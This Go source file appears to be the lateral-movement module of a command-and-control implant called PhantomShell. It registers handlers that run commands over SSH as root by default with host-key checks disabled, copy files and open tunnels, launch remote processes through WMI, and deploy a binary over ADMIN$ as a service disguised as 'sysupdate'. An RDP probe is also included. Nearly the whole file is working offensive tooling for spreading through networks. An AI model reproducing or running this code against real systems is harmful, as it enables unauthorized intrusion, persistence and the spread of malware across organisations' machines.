package modules

import (
	"fmt"
	"net"
	"runtime"
	"time"

	"github.com/OmonovSarvar/PhantomShell/agents/go/core"
)

func RegisterLateral(d *core.Dispatcher, exec *core.Executor) {
	d.Register("ssh_exec", handleSSHExec(exec))
	d.Register("scp", handleSCP(exec))
	d.Register("port_forward", handlePortForward(exec))
	d.Register("wmi_exec", handleWMIExec(exec))
	d.Register("psexec", handlePSExec(exec))
	d.Register("rdp_check", handleRDPCheck)
}

func handleSSHExec(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		host := getString(args, "host")
		user := getString(args, "user")
		command := getString(args, "command")
		keyFile := getString(args, "key")
		port := getInt(args, "port", 22)

		if host == "" || command == "" {
			return map[string]interface{}{"status": "error", "error": "host and command required"}
		}
		if user == "" {
			user = "root"
		}

		sshCmd := fmt.Sprintf("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -p %d", port)
		if keyFile != "" {
			sshCmd += fmt.Sprintf(" -i %s", keyFile)
		}
		sshCmd += fmt.Sprintf(" %s@%s '%s'", user, host, command)

		stdout, stderr, code := exec.Run(sshCmd, 0)
		return map[string]interface{}{
			"status":    statusFromCode(code),
			"stdout":    stdout,
			"stderr":    stderr,
			"exit_code": code,
		}
	}
}

func handleSCP(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		host := getString(args, "host")
		user := getString(args, "user")
		src := getString(args, "src")
		dst := getString(args, "dst")
		keyFile := getString(args, "key")
		port := getInt(args, "port", 22)
		upload := true
		if v, ok := args["download"]; ok {
			if b, ok := v.(bool); ok && b {
				upload = false
			}
		}

		if host == "" || src == "" || dst == "" {
			return map[string]interface{}{"status": "error", "error": "host, src, and dst required"}
		}
		if user == "" {
			user = "root"
		}

		scpCmd := fmt.Sprintf("scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P %d", port)
		if keyFile != "" {
			scpCmd += fmt.Sprintf(" -i %s", keyFile)
		}

		if upload {
			scpCmd += fmt.Sprintf(" %s %s@%s:%s", src, user, host, dst)
		} else {
			scpCmd += fmt.Sprintf(" %s@%s:%s %s", user, host, src, dst)
		}

		stdout, stderr, code := exec.Run(scpCmd, 0)
		return map[string]interface{}{
			"status":    statusFromCode(code),
			"stdout":    stdout,
			"stderr":    stderr,
			"exit_code": code,
		}
	}
}

func handlePortForward(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		host := getString(args, "host")
		user := getString(args, "user")
		direction := getString(args, "direction") // "local" (-L) or "remote" (-R)
		localPort := getInt(args, "local_port", 0)
		remotePort := getInt(args, "remote_port", 0)
		targetHost := getString(args, "target_host")
		keyFile := getString(args, "key")

		if host == "" || localPort == 0 || remotePort == 0 {
			return map[string]interface{}{"status": "error", "error": "host, local_port, remote_port required"}
		}
		if user == "" {
			user = "root"
		}
		if targetHost == "" {
			targetHost = "127.0.0.1"
		}

		var flag string
		if direction == "remote" {
			flag = "-R"
		} else {
			flag = "-L"
		}

		sshCmd := fmt.Sprintf("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N %s %d:%s:%d",
			flag, localPort, targetHost, remotePort)
		if keyFile != "" {
			sshCmd += fmt.Sprintf(" -i %s", keyFile)
		}
		sshCmd += fmt.Sprintf(" %s@%s", user, host)

		stdout, stderr, code := exec.Run(sshCmd, 0)
		return map[string]interface{}{
			"status":    statusFromCode(code),
			"stdout":    stdout,
			"stderr":    stderr,
			"exit_code": code,
			"tunnel":    fmt.Sprintf("%s %d:%s:%d", flag, localPort, targetHost, remotePort),
		}
	}
}

func handleWMIExec(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		if runtime.GOOS != "windows" {
			return map[string]interface{}{"status": "error", "error": "wmi_exec requires windows"}
		}
		host := getString(args, "host")
		command := getString(args, "command")
		if host == "" || command == "" {
			return map[string]interface{}{"status": "error", "error": "host and command required"}
		}

		cmd := fmt.Sprintf(`wmic /node:"%s" process call create "%s"`, host, command)
		stdout, stderr, code := exec.Run(cmd, 0)
		return map[string]interface{}{
			"status":    statusFromCode(code),
			"stdout":    stdout,
			"stderr":    stderr,
			"exit_code": code,
		}
	}
}

// handlePSExec copies a binary to a remote host via SMB and executes it as a service.
func handlePSExec(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		if runtime.GOOS != "windows" {
			return map[string]interface{}{"status": "error", "error": "psexec requires windows"}
		}
		host := getString(args, "host")
		binary := getString(args, "binary")
		svcName := getString(args, "service")
		user := getString(args, "user")
		pass := getString(args, "pass")

		if host == "" || binary == "" {
			return map[string]interface{}{"status": "error", "error": "host and binary required"}
		}
		if svcName == "" {
			svcName = "sysupdate"
		}

		remotePath := fmt.Sprintf(`\\%s\ADMIN$\%s.exe`, host, svcName)

		// Map share
		netCmd := fmt.Sprintf(`net use \\%s\ADMIN$ /user:%s %s`, host, user, pass)
		if _, stderr, code := exec.Run(netCmd, 0); code != 0 {
			return map[string]interface{}{"status": "error", "error": fmt.Sprintf("net use: %s", stderr)}
		}

		// Copy binary
		copyCmd := fmt.Sprintf(`copy /Y "%s" "%s"`, binary, remotePath)
		if _, stderr, code := exec.Run(copyCmd, 0); code != 0 {
			return map[string]interface{}{"status": "error", "error": fmt.Sprintf("copy: %s", stderr)}
		}

		// Create and start service
		scCreate := fmt.Sprintf(`sc \\%s create %s binPath= "C:\Windows\%s.exe" start= demand`, host, svcName, svcName)
		exec.Run(scCreate, 0)

		scStart := fmt.Sprintf(`sc \\%s start %s`, host, svcName)
		stdout, stderr, code := exec.Run(scStart, 0)

		return map[string]interface{}{
			"status":    statusFromCode(code),
			"stdout":    stdout,
			"stderr":    stderr,
			"exit_code": code,
			"service":   svcName,
			"remote":    remotePath,
		}
	}
}

func handleRDPCheck(args map[string]interface{}) map[string]interface{} {
	host := getString(args, "host")
	if host == "" {
		return map[string]interface{}{"status": "error", "error": "host required"}
	}

	addr := fmt.Sprintf("%s:3389", host)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return map[string]interface{}{
			"status": "success",
			"host":   host,
			"rdp":    false,
			"error":  err.Error(),
		}
	}
	conn.Close()
	return map[string]interface{}{
		"status": "success",
		"host":   host,
		"rdp":    true,
	}
}

func statusFromCode(code int) string {
	if code == 0 {
		return "success"
	}
	return "error"
}
